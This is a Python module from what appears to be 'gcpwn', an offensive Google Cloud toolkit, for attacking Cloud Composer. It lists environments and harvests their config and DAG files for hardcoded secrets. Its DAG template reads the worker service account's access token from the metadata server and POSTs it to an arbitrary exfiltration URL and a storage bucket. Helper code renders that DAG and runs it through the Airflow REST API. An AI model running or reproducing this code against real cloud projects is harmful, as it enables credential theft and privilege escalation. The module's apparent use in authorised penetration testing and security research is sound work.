from __future__ import annotations

import json
import time
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any, Iterable

from gcpwn.core.console import UtilityTools
from gcpwn.core.output_paths import resolve_download_path
from gcpwn.core.utils.action_recording import record_permissions
from gcpwn.core.utils.module_helpers import (
    extract_location_from_resource_name,
    extract_path_tail,
    extract_project_id_from_resource,
    region_resolver_for,
)
from gcpwn.core.utils.persistence import save_to_table
from gcpwn.core.utils.serialization import resource_to_dict
from gcpwn.core.utils.service_runtime import DownloadBudget, handle_service_error


resolve_regions = region_resolver_for("cloudcomposer")


def _extract_dag_gcs_prefix(row: dict[str, Any]) -> str:
    """Extract config.dag_gcs_prefix from a raw Composer environment dict."""
    config = row.get("config") if isinstance(row, dict) else None
    if isinstance(config, dict):
        prefix = config.get("dag_gcs_prefix", "")
        if prefix:
            return str(prefix)
    return ""


def _extract_worker_service_account(row: dict[str, Any]) -> str:
    """Extract the worker node SA from config.node_config.service_account."""
    config = row.get("config") if isinstance(row, dict) else None
    if isinstance(config, dict):
        node_config = config.get("node_config") if isinstance(config, dict) else None
        if isinstance(node_config, dict):
            sa = node_config.get("service_account", "")
            if sa:
                return str(sa)
    return ""


def _normalize_environment_row(row: dict[str, Any]) -> dict[str, Any]:
    if not isinstance(row, dict):
        return {}
    name = str(row.get("name") or "").strip()
    if name:
        row.setdefault("location", extract_location_from_resource_name(name))
        row.setdefault("environment_id", extract_path_tail(name, default=name))
    return row


def _format_section(title: str, values: dict[str, Any]) -> list[str]:
    lines = [title, "=" * len(title)]
    if not values:
        lines.append("(none)")
        return lines
    for key in sorted(values):
        lines.append(f"{key}={values[key]}")
    return lines


def _software_config_text(row: dict[str, Any]) -> str:
    config = row.get("config") if isinstance(row, dict) else None
    config = config if isinstance(config, dict) else {}
    software_config = config.get("software_config") if isinstance(config, dict) else None
    software_config = software_config if isinstance(software_config, dict) else {}

    airflow_config_overrides = software_config.get("airflow_config_overrides")
    airflow_config_overrides = airflow_config_overrides if isinstance(airflow_config_overrides, dict) else {}
    env_variables = software_config.get("env_variables")
    env_variables = env_variables if isinstance(env_variables, dict) else {}

    sections = [
        _format_section("Airflow Config Overrides", airflow_config_overrides),
        [""],
        _format_section("Environment Variables", env_variables),
    ]
    return "\n".join(line for section in sections for line in section)


class ComposerEnvironmentsResource:
    TABLE_NAME = "cloudcomposer_environments"
    COLUMNS = ["location", "environment_id", "name", "state", "config_gke_cluster", "config_airflow_uri",
               "dag_gcs_prefix", "worker_service_account"]
    SERVICE_LABEL = "Cloud Composer"
    LIST_PERMISSION = "composer.environments.list"
    GET_PERMISSION = "composer.environments.get"
    ACTION_RESOURCE_TYPE = "composer"

    def __init__(self, session) -> None:
        self.session = session
        try:
            from google.cloud.orchestration.airflow import service_v1  # type: ignore
        except Exception as exc:  # pragma: no cover
            raise RuntimeError(
                "Cloud Composer enumeration requires the `google-cloud-orchestration-airflow` package."
            ) from exc
        self._service_v1 = service_v1
        self.client = service_v1.EnvironmentsClient(credentials=session.credentials)

    def list(self, *, project_id: str, location: str, action_dict=None):
        parent = f"projects/{project_id}/locations/{location}"
        try:
            request = self._service_v1.ListEnvironmentsRequest(parent=parent)
            rows = [_normalize_environment_row(resource_to_dict(env)) for env in self.client.list_environments(request=request)]
            record_permissions(action_dict, permissions=self.LIST_PERMISSION, scope_key="project_permissions", scope_label=project_id)
            return rows
        except Exception as exc:
            return handle_service_error(
                exc,
                api_name=self.LIST_PERMISSION,
                resource_name=parent,
                service_label=self.SERVICE_LABEL,
                project_id=getattr(self.session, "project_id", None),
            )

    def get(self, *, resource_id: str, action_dict=None) -> dict[str, Any] | None:
        if not resource_id:
            return None
        try:
            request = self._service_v1.GetEnvironmentRequest(name=resource_id)
            row = _normalize_environment_row(resource_to_dict(self.client.get_environment(request=request)))
            record_permissions(action_dict, permissions=self.GET_PERMISSION,
                               project_id=extract_project_id_from_resource(resource_id),
                               resource_type=self.ACTION_RESOURCE_TYPE, resource_label=resource_id)
            return row
        except Exception as exc:
            return handle_service_error(
                exc,
                api_name=self.GET_PERMISSION,
                resource_name=resource_id,
                service_label=self.SERVICE_LABEL,
                project_id=getattr(self.session, "project_id", None),
            )

    def create(self, parent: str, environment_id: str, environment: dict) -> dict:
        """Create a Composer environment and block until the LRO completes.

        Uses GAPIC ``create_environment`` and waits via ``.result(timeout=3000)``.
        Environments typically take 17-30 minutes to provision.
        Returns the final ``Environment`` as a plain dict (snake_case keys).
        Raises on API error or if the operation does not complete within 3000 s.
        """
        # Environment name must be embedded in the environment object;
        # the separate environment_id field was removed in recent library versions.
        env_proto = self._service_v1.Environment(
            name=f"{parent}/environments/{environment_id}",
            **{k: v for k, v in environment.items() if k != "name"},
        )
        request = self._service_v1.CreateEnvironmentRequest(
            parent=parent,
            environment=env_proto,
        )
        op = self.client.create_environment(request=request)
        result = op.result(timeout=3000)
        return resource_to_dict(result)

    def _get_raw(self, name: str) -> dict | None:
        """Fetch a single environment by full resource name without permission recording."""
        try:
            request = self._service_v1.GetEnvironmentRequest(name=name)
            return resource_to_dict(self.client.get_environment(request=request))
        except Exception as exc:
            print(f"  [composer] poll error: {exc}")
            return None

    def poll_until_active(self, name: str, *, wait: int = 3000, sleep_s: int = 30) -> dict | None:
        """Poll ``_get_raw()`` until the environment state is RUNNING or *wait* seconds elapse.

        Returns the environment dict when RUNNING (or ERROR, so the caller can
        detect failure), or ``None`` on timeout.
        """
        terminal = {"RUNNING", "ERROR"}
        deadline = time.time() + wait
        while time.time() < deadline:
            row = self._get_raw(name)
            if row:
                state = row.get("state", "UNKNOWN")
                elapsed_min = int((wait - (deadline - time.time())) / 60)
                print(f"  [composer] state={state} (elapsed ~{elapsed_min} min)")
                if state in terminal:
                    return row
            time.sleep(sleep_s)
        print(f"{UtilityTools.YELLOW}  [composer] timed out waiting for environment.{UtilityTools.RESET}")
        return None

    def save(self, rows: Iterable[dict[str, Any]], *, project_id: str, location: str) -> None:
        for row in rows or []:
            normalized_row = _normalize_environment_row(dict(row or {}))
            name = str(normalized_row.get("name", "") or "")
            save_to_table(
                self.session,
                self.TABLE_NAME,
                normalized_row,
                defaults={"project_id": project_id, "location": location or extract_location_from_resource_name(name)},
                extra_builder=lambda _obj, raw: {
                    "environment_id": str(raw.get("environment_id") or "").strip() or extract_path_tail(raw.get("name", "")),
                    "state": raw.get("state") or "",
                    "dag_gcs_prefix": _extract_dag_gcs_prefix(raw),
                    "worker_service_account": _extract_worker_service_account(raw),
                },
            )

    def _configs_download_budget(self) -> DownloadBudget:
        # Lazily created once per resource instance (the caller constructs one
        # ComposerEnvironmentsResource per project run and calls download_environment_configs
        # per environment in a loop), so this caps total wall-clock time for the
        # "composer configs" download type without a caller-threaded budget.
        budget = getattr(self, "_download_budget", None)
        if budget is None:
            budget = DownloadBudget(self.session, label="composer configs")
            self._download_budget = budget
        return budget

    def download_environment_configs(self, *, row: dict[str, Any], project_id: str) -> Path | None:
        if self._configs_download_budget().exceeded():
            return None
        normalized_row = _normalize_environment_row(dict(row or {}))
        environment_id = str(normalized_row.get("environment_id") or "").strip()
        if not environment_id:
            return None
        destination = resolve_download_path(
            self.session,
            service_name="cloudcomposer",
            project_id=project_id,
            filename=f"{environment_id}_configs.txt",
            sanitize_fallback=True,
        )
        destination.write_text(_software_config_text(normalized_row), encoding="utf-8")
        return destination

    def download_dag_files(self, *, row: dict[str, Any], project_id: str,
                           session=None, max_files: int = 50) -> list[Path]:
        """Download DAG Python files from the environment's DAG GCS bucket.

        DAG files frequently contain hardcoded credentials, service account keys, GCP API
        calls with embedded auth tokens, or inline secret values written by the ops team.
        Requires `storage.objects.list` + `storage.objects.get` on the DAG bucket.
        """
        from google.cloud import storage as _gcs
        from gcpwn.core.output_paths import resolve_download_path

        dag_prefix = _extract_dag_gcs_prefix(row)
        if not dag_prefix:
            return []

        # Parse gs://BUCKET/dags from the prefix
        if dag_prefix.startswith("gs://"):
            parts = dag_prefix[5:].split("/", 1)
            bucket_name = parts[0]
            blob_prefix = (parts[1].rstrip("/") + "/") if len(parts) > 1 else "dags/"
        else:
            return []

        _session = session or self.session
        paths: list[Path] = []
        try:
            gcs = _gcs.Client(credentials=_session.credentials, project=project_id)
            blobs = list(gcs.list_blobs(bucket_name, prefix=blob_prefix, max_results=max_files))
            py_blobs = [b for b in blobs if b.name.endswith(".py")]
            if not py_blobs:
                return []
            env_id = str(row.get("environment_id") or "").strip() or extract_path_tail(str(row.get("name", "")))
            for blob in py_blobs:
                filename = blob.name.split("/")[-1]
                dest = resolve_download_path(
                    _session,
                    service_name="cloudcomposer",
                    project_id=project_id,
                    filename=f"{env_id}_dag_{filename}",
                    sanitize_fallback=True,
                )
                try:
                    dest.write_bytes(blob.download_as_bytes())
                    paths.append(dest)
                except Exception as exc:
                    print(f"  [composer] DAG download error for {blob.name}: {exc}")
        except Exception as exc:
            print(f"  [composer] DAG bucket access error ({bucket_name}): {exc}")
        return paths

    def delete(self, *, name: str) -> None:
        try:
            request = self._service_v1.DeleteEnvironmentRequest(name=name)
            op = self.client.delete_environment(request=request)
            op_name = getattr(getattr(op, "operation", None), "name", name)
            print(f"  [cleanup] environment delete requested: {op_name}")
        except Exception as exc:
            print(f"{UtilityTools.YELLOW}  [cleanup] environment delete error: {exc}{UtilityTools.RESET}")


_DAG_TEMPLATE = """\
import json, urllib.request
from datetime import datetime, timezone
from airflow import DAG
from airflow.operators.python import PythonOperator

_OUTPUT_BUCKET = "__OUTPUT_BUCKET__"
_OUTPUT_KEY = "__OUTPUT_KEY__"
_EXFIL_URL = "__EXFIL_URL__"


def _exfil_token(**ctx):
    meta = (
        "http://metadata.google.internal"
        "/computeMetadata/v1/instance/service-accounts/default"
    )

    def _get(path):
        req = urllib.request.Request(
            f"{meta}/{path}", headers={"Metadata-Flavor": "Google"}
        )
        return urllib.request.urlopen(req, timeout=10).read()

    tok = json.loads(_get("token"))
    email = _get("email").decode()
    token = tok["access_token"]

    print(f"GCPWN_COMPOSER_EMAIL={email}")
    print(f"GCPWN_COMPOSER_TOKEN={token}")

    if _EXFIL_URL:
        body = json.dumps({"email": email, "access_token": token}).encode()
        req = urllib.request.Request(
            _EXFIL_URL, data=body, method="POST",
            headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
        )
        try:
            urllib.request.urlopen(req, timeout=30)
        except Exception as exc:
            print(f"[exfil_url] error: {exc}")

    if _OUTPUT_BUCKET:
        proof = json.dumps({
            "access_token": token,
            "sa_email": email,
            "retrieved_utc": datetime.now(timezone.utc).isoformat(),
        }, indent=2).encode()
        gcs_upload_url = (
            "https://storage.googleapis.com/upload/storage/v1/b/"
            f"{_OUTPUT_BUCKET}/o?uploadType=media&name={_OUTPUT_KEY}"
        )
        req = urllib.request.Request(
            gcs_upload_url, data=proof, method="POST",
            headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
        )
        urllib.request.urlopen(req, timeout=30)
        print(f"GCPWN_COMPOSER_GCS=gs://{_OUTPUT_BUCKET}/{_OUTPUT_KEY}")


with DAG(
    dag_id="__DAG_ID__",
    start_date=datetime(2024, 1, 1, tzinfo=timezone.utc),
    schedule=None,
    catchup=False,
    tags=["gcpwn-pe"],
) as dag:
    _ = PythonOperator(task_id="exfil_token", python_callable=_exfil_token)
"""


class ComposerAirflowResource:
    """Helpers for the Airflow REST API exposed by a Cloud Composer environment."""

    @staticmethod
    def make_dag(dag_id: str, output_bucket: str, output_key: str, exfil_url: str = "") -> str:
        """Render the exfil DAG Python source from the template."""
        return (
            _DAG_TEMPLATE
            .replace("__DAG_ID__", dag_id)
            .replace("__OUTPUT_BUCKET__", output_bucket or "")
            .replace("__OUTPUT_KEY__", output_key or "")
            .replace("__EXFIL_URL__", exfil_url or "")
        )

    def airflow_request(
        self,
        airflow_url: str,
        method: str,
        path: str,
        token: str,
        body: dict | None = None,
    ) -> dict | None:
        """Make an authenticated request to the Airflow REST API.

        Returns a parsed JSON dict. On HTTP error returns
        ``{"_http_error": <status>, "_body": <text>}``; on other exceptions
        returns ``{"_error": <message>}``.
        """
        url = airflow_url.rstrip("/") + path
        data = json.dumps(body).encode() if body else None
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        }
        req = urllib.request.Request(url, data=data, method=method, headers=headers)
        try:
            resp = urllib.request.urlopen(req, timeout=30)
            return json.loads(resp.read())
        except urllib.error.HTTPError as exc:
            return {"_http_error": exc.code, "_body": exc.read().decode(errors="replace")}
        except Exception as exc:
            return {"_error": str(exc)}

    def wait_dag_loaded(
        self,
        airflow_url: str,
        dag_id: str,
        token: str,
        *,
        wait: int = 120,
        sleep_s: int = 15,
    ) -> bool:
        """Poll the Airflow REST API until *dag_id* is active or *wait* seconds elapse."""
        deadline = time.time() + wait
        while time.time() < deadline:
            result = self.airflow_request(airflow_url, "GET", f"/api/v1/dags/{dag_id}", token)
            if result and result.get("is_active") and not result.get("_http_error"):
                return True
            time.sleep(sleep_s)
        return False

    def wait_dagrun(
        self,
        airflow_url: str,
        dag_id: str,
        run_id: str,
        token: str,
        *,
        wait: int = 600,
        sleep_s: int = 20,
    ) -> bool:
        """Poll the Airflow REST API until the DAG run reaches a terminal state.

        Returns ``True`` if the run succeeded, ``False`` on failure, timeout, or
        HTTP error.
        """
        terminal = {"success", "failed"}
        deadline = time.time() + wait
        while time.time() < deadline:
            result = self.airflow_request(
                airflow_url, "GET",
                f"/api/v1/dags/{dag_id}/dagRuns/{run_id}",
                token,
            )
            if result:
                state = result.get("state", "unknown")
                print(f"  [airflow] dag_run state={state}")
                if state in terminal or result.get("_http_error"):
                    return state == "success"
            time.sleep(sleep_s)
        return False
